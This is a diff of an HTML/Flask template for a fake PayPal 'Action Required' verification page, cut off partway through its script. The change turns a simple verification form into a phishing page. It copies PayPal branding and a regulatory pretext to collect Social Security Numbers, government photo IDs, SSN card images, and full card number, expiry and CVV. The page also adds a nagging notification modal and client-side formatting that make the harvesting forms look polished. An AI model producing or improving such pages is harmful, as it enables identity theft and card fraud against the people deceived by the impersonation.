@@ -3,64 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Your Information - PayPal</title>
+    <title>Action Required - PayPal Account</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
-    <link rel="icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" type="image/x-icon">
-    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" type="image/x-icon">
+    <link rel="icon" href="{{ url_for('static', filename='paypal logo.jpg') }}" type="image/x-icon">
+    <link rel="shortcut icon" href="{{ url_for('static', filename='paypal logo.jpg') }}" type="image/x-icon">
 
     <style>
+        /* General Body and Container Styles */
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #f7f8f9; /* PayPal's light gray background */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            background-color: #f7f8f9;
             margin: 0;
-            padding: 20px;
-            box-sizing: border-box;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
+        }
+
+        .main-content-wrapper {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px 20px;
+            box-sizing: border-box;
         }
 
         .container {
             background-color: #fff;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); /* Stronger shadow */
-            padding: 32px; /* Generous padding */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            padding: 32px;
             width: 100%;
-            max-width: 450px; /* Slightly wider for the content */
-            text-align: center;
+            max-width: 580px;
             box-sizing: border-box;
+            text-align: center;
         }
 
+        /* PayPal Logo Styles */
         .paypal-logo {
             width: 100px;
             height: 30px;
-            background: url('https://www.paypalobjects.com/webstatic/mktg/icons/primary-logo.png') no-repeat center center;
-            background-size: contain;
+            object-fit: contain;
             margin: 0 auto 30px auto;
-            font-size: 0;
+            display: block;
         }
 
+        /* Headings and Paragraphs */
         h1 {
-            color: #003087; /* PayPal's dark blue */
-            font-size: 28px; /* Larger font size */
+            color: #003087;
+            font-size: 28px;
             font-weight: 600;
             margin-bottom: 20px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #003087;
+            font-size: 22px;
+            font-weight: 600;
+            margin-top: 30px;
+            margin-bottom: 15px;
+            text-align: left;
         }
 
         p {
             font-size: 16px;
             line-height: 1.5;
             color: #333;
-            margin-bottom: 25px;
+            margin-bottom: 15px;
+            text-align: left;
         }
 
-        .input-group {
-            margin-bottom: 24px; /* Space between input fields */
+        ul {
+            list-style: disc;
+            padding-left: 20px;
             text-align: left;
-            position: relative; /* For floating label */
+            margin-bottom: 20px;
+        }
+
+        li {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 8px;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #003087;
+            margin-top: 25px;
+            margin-bottom: 15px;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+        }
+
+        .info-box {
+            background-color: #e0f8ff;
+            border: 1px solid #cceeff;
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: left;
+            display: flex;
+            align-items: flex-start;
+        }
+        .info-box .icon {
+            font-size: 20px;
+            color: #0070ba;
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        .info-box p {
+            margin: 0;
+            font-size: 15px;
+            color: #333;
+        }
+
+        /* Input Fields and Labels */
+        .input-group {
+            margin-bottom: 24px;
+            text-align: left;
+            position: relative;
         }
 
         .input-label {
@@ -71,17 +138,24 @@
             font-size: 16px;
             pointer-events: none;
             transition: all 0.2s ease-out;
+            background-color: #fff;
+            padding: 0 4px;
+            transform: translateY(-50%) scale(1);
+            transform-origin: left top;
+            z-index: 1;
         }
 
         .input-field {
             width: 100%;
-            padding: 18px 12px 6px 12px; /* Top padding for floating label */
+            padding: 18px 12px 6px 12px;
             border: 1px solid #ddd;
             border-radius: 4px;
             font-size: 16px;
             transition: border-color 0.3s ease;
             box-sizing: border-box;
             background-color: #fff;
+            position: relative;
+            z-index: 0;
         }
         .input-field:focus {
             outline: none;
@@ -92,15 +166,96 @@
         /* Floating Label effect */
         .input-field:focus + .input-label,
         .input-field:not(:placeholder-shown) + .input-label {
-            top: 6px;
+            top: -8px;
+            left: 8px;
             font-size: 12px;
             color: #003087;
+            transform: translateY(0) scale(0.9);
+            background-color: #fff;
+            padding: 0 4px;
         }
         .input-field:not(:placeholder-shown) {
             padding-top: 18px;
         }
 
-        /* Styles for the "Upload a photo ID" button, matching the PayPal style */
+        /* Styles for the "Show/Hide" toggle button for SSN and CVV */
+        .toggle-visibility-button {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #0070ba;
+            font-size: 1em;
+            font-weight: 600;
+            z-index: 2;
+            padding: 5px;
+        }
+        .toggle-visibility-button:hover {
+            text-decoration: underline;
+        }
+        .toggle-visibility-button.hidden {
+            display: none;
+        }
+
+        /* Credit Card specific styles */
+        .card-number-group {
+            position: relative; /* Needed for positioning card type icon */
+        }
+
+        /* --- MODIFIED CARD TYPE ICON STYLES --- */
+        .card-type-icon {
+            position: absolute;
+            right: 12px; /* Position inside the input field, to the right */
+            top: 50%;
+            transform: translateY(-50%);
+            width: 40px; /* Adjust width as needed for your logos */
+            height: 25px; /* Adjust height as needed for your logos */
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            pointer-events: none; /* Don't block input interaction */
+            z-index: 1; /* Above input, below label if label is also absolute */
+        }
+
+        /* Placeholder SVGs. Replace these with real logo paths (e.g., url('/images/visa.svg')) or better SVGs */
+        .card-type-icon.visa {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%231A1F71'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='20' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EVISA%3C/text%3E%3C/svg%3E");
+        }
+        .card-type-icon.mastercard {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23F0F0F0'/%3E%3Ccircle cx='38' cy='30' r='18' fill='%23EB001B'/%3E%3Ccircle cx='62' cy='30' r='18' fill='%23F79E1B'/%3E%3Cpath d='M50,30 A18,18 0 0,0 50,30 Z' fill='%23FF5F00'/%3E%3C!-- %3Ctext x='50' y='52' font-size='8' text-anchor='middle' fill='%23555'%3EMastercard%3C/text%3E --%3E%3C/svg%3E");
+        }
+        .card-type-icon.amex {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23006FCF'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='20' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EAMEX%3C/text%3E%3C/svg%3E");
+        }
+        .card-type-icon.discover {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23FF6600'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='16' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EDISCOVER%3C/text%3E%3C/svg%3E");
+        }
+        .card-type-icon.jcb {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23003A80'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='20' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EJCB%3C/text%3E%3C/svg%3E");
+        }
+        .card-type-icon.dinersclub { /* Mapped from "Diners Club" in JS */
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 60'%3E%3Crect width='100' height='60' rx='5' ry='5' fill='%23004B8D'/%3E%3Ctext x='50' y='38' font-family='Arial, Helvetica, sans-serif' font-size='14' fill='white' text-anchor='middle' dominant-baseline='middle' font-weight='bold'%3EDINERS CLUB%3C/text%3E%3C/svg%3E");
+        }
+        /* --- END OF MODIFIED CARD TYPE ICON STYLES --- */
+
+        .card-details-row {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 24px;
+        }
+        .card-details-row .input-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
+        .card-details-row .input-field {
+            padding: 18px 12px 6px 12px;
+        }
+
+
+        /* Upload Button Styles */
         .upload-photo-id-container {
             display: flex;
             align-items: center;
@@ -111,7 +266,7 @@
             padding: 15px 20px;
             margin-bottom: 25px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.05);
-            cursor: pointer; /* Indicate it's clickable */
+            cursor: pointer;
             transition: border-color 0.3s ease, box-shadow 0.3s ease;
         }
         .upload-photo-id-container:hover {
@@ -127,15 +282,16 @@
         }
         .upload-photo-id-container .text-info .icon {
             margin-right: 10px;
-            color: #f7a823; /* PayPal's yellow/orange for info icon */
+            color: #f7a823;
             font-size: 20px;
+            line-height: 1;
         }
         .upload-photo-id-button {
-            background-color: #0070ba; /* PayPal blue */
+            background-color: #0070ba;
             color: white;
             padding: 10px 20px;
             border: none;
-            border-radius: 20px; /* More rounded for button */
+            border-radius: 20px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
@@ -144,25 +300,12 @@
         .upload-photo-id-button:hover {
             background-color: #003087;
         }
-        /* Hide the default file input */
-        .hidden-file-input {
-            display: none;
-        }
-        .image-preview-container {
-            margin-top: -15px; /* Adjust to pull closer to upload button */
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .image-preview {
-            max-width: 100px;
-            max-height: 100px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            display: block;
-            margin: 0 auto;
-            object-fit: cover;
-        }
-        .info-note { /* Style for the "We generally take up to..." message */
+        .hidden-file-input { display: none; }
+        .image-preview-container { margin-top: -15px; margin-bottom: 20px; text-align: center; }
+        .image-preview { max-width: 100px; max-height: 100px; border: 1px solid #ddd; border-radius: 4px; display: block; margin: 0 auto; object-fit: cover; }
+
+        /* Info Note at bottom of form */
+        .info-note {
             font-size: 14px;
             color: #555;
             margin-top: 20px;
@@ -176,7 +319,7 @@
             vertical-align: middle;
         }
 
-        /* Action buttons at the bottom */
+        /* Main Action Button */
         .action-button {
             background-color: #0070ba;
             color: white;
@@ -192,139 +335,691 @@
             width: 100%;
             margin-bottom: 15px;
         }
-        .action-button:hover {
-            background-color: #003087;
-        }
-        .action-button:focus {
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.25);
-        }
+        .action-button:hover { background-color: #003087; }
+        .action-button:focus { outline: none; box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.25); }
+
+        /* Secondary Link (e.g., "Not you?") */
         .secondary-link {
             display: block;
             margin-top: 10px;
             font-size: 14px;
             color: #0070ba;
             text-decoration: none;
-            font-weight: 600; /* Made consistent with other links */
+            font-weight: 600;
         }
-        .secondary-link:hover {
+        .secondary-link:hover { text-decoration: underline; }
+
+        /* --- HEADER STYLES --- */
+        .header-bar {
+            background-color: #003087;
+            color: white;
+            padding: 15px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            width: 100%;
+            box-sizing: border-box;
+            z-index: 1000;
+        }
+        .header-left .paypal-logo-header {
+            width: 80px;
+            height: 24px;
+            object-fit: contain;
+            display: block;
+        }
+        .header-nav ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            gap: 25px;
+        }
+        .header-nav a {
+            color: white;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: color 0.2s ease;
+        }
+        .header-nav a:hover {
+            color: #a0cff7;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .header-right .icon-bell {
+            font-size: 20px;
+            color: white;
+            cursor: pointer;
+            position: relative;
+        }
+        .notification-dot {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background-color: #e53e3e;
+            border-radius: 50%;
+            width: 10px;
+            height: 10px;
+            display: none;
+        }
+        .header-right .logout-btn {
+            background: none;
+            border: 1px solid white;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            transition: background-color 0.2s ease, color 0.2s ease;
+        }
+        .logout-btn:hover {
+            background-color: white;
+            color: #003087;
+        }
+
+        /* --- FOOTER STYLES --- */
+        .footer-bar {
+            background-color: #f7f8f9;
+            padding: 40px 20px;
+            border-top: 1px solid #e0e0e0;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .footer-links-group {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 25px;
+            margin-bottom: 25px;
+        }
+        .footer-links-group .col {
+            min-width: 120px;
+            text-align: left;
+        }
+        .footer-links-group .col h4 {
+            color: #003087;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        .footer-links-group .col ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .footer-links-group .col a {
+            color: #555;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .footer-links-group .col a:hover {
             text-decoration: underline;
+            color: #0070ba;
+        }
+        .footer-bottom-text {
+            font-size: 14px;
+            color: #6a6a6a;
+            margin-top: 20px;
+        }
+        .footer-bottom-text a {
+            color: #0070ba;
+            text-decoration: none;
+        }
+        .footer-bottom-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* Notification Modal (Hidden by default) */
+        .notification-modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            max-width: 400px;
+            text-align: center;
+        }
+        .notification-modal h3 {
+            color: #003087;
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+        .notification-modal p {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 25px;
+        }
+        .notification-modal button {
+            background-color: #0070ba;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background-color 0.2s ease;
+        }
+        .notification-modal button:hover {
+            background-color: #003087;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="paypal-logo" role="img" aria-label="PayPal Logo"></div>
-        <h1>Verify Your Information</h1>
-        <p>Please confirm your details and upload a photo ID to proceed securely.</p>
+    <header class="header-bar">
+        <div class="header-left">
+            <img src="{{ url_for('static', filename='paypal logo.jpg') }}" alt="PayPal Logo" class="paypal-logo-header">
+        </div>
+        <nav class="header-nav">
+            <ul>
+                <li><a href="#">Home</a></li>
+                <li><a href="#">Finances</a></li>
+                <li><a href="#">Send and Request</a></li>
+                <li><a href="#">Rewards</a></li>
+                <li><a href="#">Wallet</a></li>
+                <li><a href="#">Activity</a></li>
+                <li><a href="#">Help</a></li>
+            </ul>
+        </nav>
+        <div class="header-right">
+            <span class="icon-bell" id="notification-bell">&#128276;<span class="notification-dot" id="notification-dot"></span></span>
+            <button class="logout-btn" id="header-logout-button">LOG OUT</button>
+        </div>
+    </header>
 
-        <form id="verification-form">
-            <div class="input-group">
-                <input type="text" id="full-name" name="full-name" class="input-field" required placeholder=" ">
-                <label for="full-name" class="input-label">Full Name</label>
-            </div>
-            <div class="input-group">
-                <input type="tel" id="phone-number" name="phone-number" class="input-field" required placeholder=" ">
-                <label for="phone-number" class="input-label">Phone Number</label>
-            </div>
-
-            <div class="upload-photo-id-container">
-                <div class="text-info">
-                    <span class="icon">&#9200;</span> <span>Upload a photo ID</span>
-                </div>
-                <input type="file" id="photo-id-input" name="photo-id" accept="image/*" class="hidden-file-input">
-                <button type="button" class="upload-photo-id-button" id="upload-button">Upload</button>
-            </div>
-            <div class="image-preview-container">
-                <img id="photo-id-preview" class="image-preview" src="" alt="Photo ID Preview" style="display: none;">
-            </div>
-            <p class="info-note">
-                <span class="info-icon">&#9432;</span> We generally take up to 1 business day(s) to review requests and get back.
-            </p>
-
-            <button type="submit" class="action-button" style="margin-top: 30px;">Confirm and Continue</button>
-            <a href="./index.html" class="secondary-link">Not you? Go back to Login</a>
-        </form>
+    <div class="notification-modal" id="notification-modal">
+        <h3>Action Required for Your PayPal Account</h3>
+        <p>Your account requires updated details to comply with financial regulations and ensure full functionality. Please complete the verification step.</p>
+        <button id="modal-proceed-button">Go to Verification</button>
     </div>
 
-    <script>
-        const verificationForm = document.getElementById('verification-form');
-        const fullNameInput = document.getElementById('full-name');
-        const phoneNumberInput = document.getElementById('phone-number');
-        const photoIdInput = document.getElementById('photo-id-input');
-        const photoIdPreview = document.getElementById('photo-id-preview');
-        const uploadButton = document.getElementById('upload-button');
+    <div class="main-content-wrapper">
+        <div class="container">
+            <img src="{{ url_for('static', filename='paypal logo.jpg') }}" alt="PayPal Logo" class="paypal-logo">
 
-        // Event listener to trigger hidden file input when "Upload" button is clicked
-        uploadButton.addEventListener('click', () => {
-            photoIdInput.click(); // Programmatically click the hidden file input
+            <h1>Important: Action Required for Your PayPal Account</h1>
+
+            <div class="info-box">
+                <span class="icon">&#9432;</span>
+                <p>To ensure the continued security and compliance of your PayPal account, we periodically conduct reviews of customer information. We require some updated details from you to comply with financial regulations and to ensure your account remains fully functional. Please provide the following information to complete this important verification step:</p>
+            </div>
+
+            <form id="verification-form">
+                <div class="section-title">1. Confirm Your Full Name</div>
+                <p>Please use your full legal name registered with PayPal, accurately matched to your government-issued identification.</p>
+                <div class="input-group">
+                    <input type="text" id="full-name" name="full-name" class="input-field" required placeholder=" ">
+                    <label for="full-name" class="input-label">Full Legal Name</label>
+                </div>
+
+                <div class="section-title">2. Verify Your Phone Number</div>
+                <p>We require confirmation of your primary number for enhanced account security and communication.</p>
+                <div class="input-group">
+                    <input type="tel" id="phone-number" name="phone-number" class="input-field" required placeholder=" ">
+                    <label for="phone-number" class="input-label">Registered Phone Number (e.g., (123) 456-7890)</label>
+                </div>
+
+                <div class="section-title">3. Verify Your Social Security Number (SSN)</div>
+                <p>For identity verification and regulatory compliance, please provide your Social Security Number (SSN).</p>
+                <div class="input-group">
+                    <input type="text" id="ssn" name="ssn" class="input-field" placeholder=" " inputmode="numeric" autocomplete="off" maxlength="11" required>
+                    <label for="ssn" class="input-label">Social Security Number (XXX-XX-XXXX)</label>
+                    <button type="button" id="toggle-ssn-visibility" class="toggle-visibility-button">Show</button>
+                </div>
+
+                <div class="section-title">4. Upload Government-Issued Photo Identification</div>
+                <p>To fulfill regulatory obligations, we require a clear copy of a valid, government-issued photo identification document.</p>
+                <ul>
+                    <li>Accepted Document Types: Passport - Driver's License - National Identity Card.</li>
+                    <li>Submission Guidelines:</li>
+                    <ul>
+                        <li>The document must be current and not expired.</li>
+                        <li>Upload both the front and back of your ID cards (for passports, only the photo page is needed).</li>
+                        <li>Ensure all four corners of the document are visible.</li>
+                        <li>All text and your photograph must be clear and legible.</li>
+                        <li>Your full name, date of birth, issue and expiration dates, and document identification number must be clearly visible.</li>
+                    </ul>
+                </ul>
+
+                <div class="upload-photo-id-container" id="upload-photo-id-trigger">
+                    <div class="text-info">
+                        <span class="icon">&#9200;</span>
+                        <span>Upload a photo ID</span>
+                    </div>
+                    <input type="file" id="photo-id-input" name="photo-id" accept="image/*" class="hidden-file-input">
+                    <button type="button" class="upload-photo-id-button">Upload</button>
+                </div>
+                <div class="image-preview-container">
+                    <img id="photo-id-preview" class="image-preview" src="" alt="Photo ID Preview" style="display: none;">
+                </div>
+
+                <div class="upload-photo-id-container" id="upload-ssn-card-trigger" style="display:none;"> <div class="text-info">
+                        <span class="icon">&#128179;</span>
+                        <span>Upload SSN Card (Optional)</span>
+                    </div>
+                    <input type="file" id="ssn-card-input" name="ssn-card" accept="image/*" class="hidden-file-input">
+                    <button type="button" class="upload-photo-id-button">Upload</button>
+                </div>
+                <div class="image-preview-container">
+                    <img id="ssn-card-preview" class="image-preview" src="" alt="SSN Card Preview" style="display: none;">
+                </div>
+
+
+                <div class="section-title">5. Review and Confirm Linked Financial Instrument</div>
+                <p>For security and compliance purposes, we may ask you to confirm details of your linked bank accounts or credit/debit cards.</p>
+                <ul>
+                    <li>Linked Bank Accounts: Verify Bank</li>
+                    <li>Linked Cards: Verify your card</li>
+                </ul>
+                <div class="input-group card-number-group">
+                    <input type="text" id="card-number" name="card-number" class="input-field" placeholder=" " inputmode="numeric" autocomplete="cc-number">
+                    <label for="card-number" class="input-label">Card Number</label>
+                    <div id="card-type-icon" class="card-type-icon"></div>
+                </div>
+                <div class="card-details-row">
+                    <div class="input-group">
+                        <input type="text" id="expiry-date" name="expiry-date" class="input-field" placeholder=" " inputmode="numeric" autocomplete="cc-exp" maxlength="5">
+                        <label for="expiry-date" class="input-label">MM/YY</label>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="cvv" name="cvv" class="input-field" placeholder=" " inputmode="numeric" autocomplete="cc-csc" maxlength="4">
+                        <label for="cvv" class="input-label">CVV</label>
+                        <button type="button" id="toggle-cvv-visibility" class="toggle-visibility-button">
+                            Show
+                        </button>
+                    </div>
+                </div>
+
+                <p class="info-note">
+                    <span class="info-icon">&#9432;</span>
+                    Upon submission of the required information, our team will review it. We generally take up to 1 business day(s) to review requests and get back.
+                </p>
+
+                <h2 style="text-align: left; margin-top: 30px;">Why is this necessary?</h2>
+                <p style="text-align: left;">As a regulated financial institution, PayPal is obligated to periodically collect and verify customer identity information. This process is essential for complying with anti-money laundering (AML) and other financial regulations, helping to ensure the security of your account and the integrity of our payment platform for all users.</p>
+
+
+                <button type="submit" class="action-button" style="margin-top: 30px;">Confirm and Continue</button>
+                <a href="./index.html" class="secondary-link">Not you? Go back to Login</a>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer-bar">
+        <div class="footer-links-group">
+            <div class="col">
+                <img src="{{ url_for('static', filename='paypal logo.jpg') }}" alt="PayPal Logo" class="paypal-logo" style="width: 80px; height: 24px; margin: 0;">
+            </div>
+            <div class="col">
+                <h4>Help</h4>
+                <ul>
+                    <li><a href="#">Contact Us</a></li>
+                    <li><a href="#">Security</a></li>
+                    <li><a href="#">Fees</a></li>
+                </ul>
+            </div>
+            <div class="col">
+                <h4>Legal</h4>
+                <ul>
+                    <li><a href="#">Privacy</a></li>
+                    <li><a href="#">Cookies</a></li>
+                    <li><a href="#">Legal</a></li>
+                    <li><a href="#">Policy Updates</a></li>
+                </ul>
+            </div>
+        </div>
+        <p class="footer-bottom-text">© 1999-2025 PayPal, Inc. All rights reserved.</p>
+    </footer>
+
+    <script>
+        // --- General Page Elements ---
+        const notificationBell = document.getElementById('notification-bell');
+        const notificationDot = document.getElementById('notification-dot');
+        const notificationModal = document.getElementById('notification-modal');
+        const modalProceedButton = document.getElementById('modal-proceed-button');
+        const headerLogoutButton = document.getElementById('header-logout-button');
+
+        window.addEventListener('DOMContentLoaded', () => {
+            notificationDot.style.display = 'block';
         });
 
-        // Event listener for image preview when file is selected
+        notificationBell.addEventListener('click', () => {
+            notificationModal.style.display = 'block';
+            notificationDot.style.display = 'none';
+        });
+
+        modalProceedButton.addEventListener('click', () => {
+            // Assuming verification.html is the current page, or adjust as needed
+            // If this button is to dismiss the modal and stay on the page, change behavior.
+            // For now, let's assume it's a prompt to "proceed" on the current page.
+            // window.location.href = './verification.html'; // Or simply close modal
+            notificationModal.style.display = 'none';
+        });
+
+        headerLogoutButton.addEventListener('click', async () => {
+            try {
+                const response = await fetch('/logout', { method: 'POST' });
+                if (response.ok) {
+                    window.location.href = './index.html';
+                } else {
+                    alert('Logout failed. Please try again.');
+                }
+            } catch (error) {
+                console.error('Logout error:', error);
+                alert('An error occurred during logout.');
+            }
+        });
+
+        // --- SSN Input and Formatting Logic ---
+        const ssnInput = document.getElementById('ssn');
+        const toggleSsnVisibilityButton = document.getElementById('toggle-ssn-visibility');
+        let rawSsn = ''; // Stores the actual 9-digit SSN without hyphens
+
+        ssnInput.addEventListener('input', function() {
+            let currentDigits = this.value.replace(/[^0-9]/g, '');
+            if (currentDigits.length > 9) {
+                currentDigits = currentDigits.substring(0, 9);
+            }
+            rawSsn = currentDigits;
+
+            if (this.type === 'password') {
+                this.value = formatAndCensorSsn(rawSsn);
+            } else {
+                this.value = formatSsn(rawSsn);
+            }
+            // Ensure label floats correctly if input type changes affecting :placeholder-shown
+            this.dispatchEvent(new Event('blur')); // Trigger blur to re-evaluate label
+            this.dispatchEvent(new Event('focus'));// then focus to keep cursor
+        });
+
+        ssnInput.addEventListener('blur', function() {
+            if (this.type === 'password') {
+                 this.value = formatAndCensorSsn(rawSsn);
+            } else {
+                 this.value = formatSsn(rawSsn);
+            }
+        });
+
+
+        toggleSsnVisibilityButton.addEventListener('click', function() {
+            if (ssnInput.type === 'password') {
+                ssnInput.type = 'text';
+                this.textContent = 'Hide';
+                ssnInput.value = formatSsn(rawSsn);
+            } else {
+                ssnInput.type = 'password';
+                this.textContent = 'Show';
+                ssnInput.value = formatAndCensorSsn(rawSsn);
+            }
+        });
+
+        function formatSsn(ssn) {
+            if (!ssn) return '';
+            let formatted = ssn;
+            if (formatted.length > 3) {
+                formatted = formatted.substring(0, 3) + '-' + formatted.substring(3);
+            }
+            if (formatted.length > 6) {
+                formatted = formatted.substring(0, 6) + '-' + formatted.substring(6);
+            }
+            return formatted;
+        }
+
+        function formatAndCensorSsn(ssnValue) {
+            if (!ssnValue) return '';
+            if (ssnValue.length <= 5) {
+                return '***-**-'.substring(0, ssnValue.length + Math.floor(ssnValue.length / 3)) + ssnValue.substring(ssnValue.length);
+            }
+            const lastFour = ssnValue.substring(ssnValue.length - 4);
+            return '***-**-' + lastFour;
+        }
+
+
+        // --- Credit Card Input Logic ---
+        const cardNumberInput = document.getElementById('card-number');
+        const expiryDateInput = document.getElementById('expiry-date');
+        const cvvInput = document.getElementById('cvv');
+        const cardTypeIcon = document.getElementById('card-type-icon');
+        const toggleCvvVisibilityButton = document.getElementById('toggle-cvv-visibility');
+
+        const cardTypes = [
+            // iconClass is no longer used by this implementation, but kept for reference
+            { name: "Visa", pattern: /^4/, iconClass: "unused-fa-cc-visa" },
+            { name: "Mastercard", pattern: /^5[1-5]/, iconClass: "unused-fa-cc-mastercard" },
+            { name: "Amex", pattern: /^3[47]/, iconClass: "unused-fa-cc-amex" },
+            { name: "Discover", pattern: /^6(?:011|5|4[4-9]|22(?:12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5]))/, iconClass: "unused-fa-cc-discover" },
+            { name: "JCB", pattern: /^(?:2131|1800|35)/, iconClass: "unused-fa-cc-jcb" },
+            { name: "Diners Club", pattern: /^3(?:0[0-5]|[68][0-9])/, iconClass: "unused-fa-cc-diners-club" },
+        ];
+
+        cardNumberInput.addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, '');
+            let formattedValue = '';
+            let cardType = null;
+
+            for (const type of cardTypes) {
+                if (type.pattern.test(value)) {
+                    cardType = type;
+                    break;
+                }
+            }
+
+            if (cardType && cardType.name === "Amex") {
+                this.maxLength = 17; // 15 digits + 2 spaces
+                if (value.length > 4) formattedValue += value.substring(0, 4) + ' '; else formattedValue += value.substring(0, 4);
+                if (value.length > 10) formattedValue += value.substring(4, 10) + ' ' + value.substring(10,15);
+                else if (value.length > 4) formattedValue += value.substring(4,10);
+
+            } else { // Default to 4-4-4-4 for most cards (16 digits usually)
+                this.maxLength = 19; // 16 digits + 3 spaces
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0 && i < 16) { // Add spaces for up to 16 digits
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                    if (i >=15 && cardType && cardType.name !== "Amex") break; // Limit to 16 digits for non-Amex
+                    if (i >=14 && cardType && cardType.name === "Amex") break; // Limit to 15 digits for Amex
+                }
+            }
+            this.value = formattedValue.trim();
+
+
+            // --- MODIFIED: Update card type icon using CSS classes ---
+            cardTypeIcon.className = 'card-type-icon'; // Reset to base class
+            if (cardType) {
+                let cssClassName = cardType.name.toLowerCase().replace(/\s+/g, ''); // e.g., "dinersclub"
+                cardTypeIcon.classList.add(cssClassName);
+                cardTypeIcon.title = cardType.name;
+            } else {
+                cardTypeIcon.title = '';
+            }
+            // --- END OF MODIFICATION ---
+        });
+
+
+        expiryDateInput.addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2,4);
+            }
+            this.value = value;
+        });
+
+        toggleCvvVisibilityButton.addEventListener('click', function() {
+            if (cvvInput.type === 'password') {
+                cvvInput.type = 'text';
+                this.textContent = 'Hide';
+            } else {
+                cvvInput.type = 'password';
+                this.textContent = 'Show';
+            }
+        });
+
+
+        // --- File Upload Logic ---
+        const photoIdInput = document.getElementById('photo-id-input');
+        const photoIdPreview = document.getElementById('photo-id-preview');
+        const uploadPhotoIdTrigger = document.getElementById('upload-photo-id-trigger'); // Container for click
+
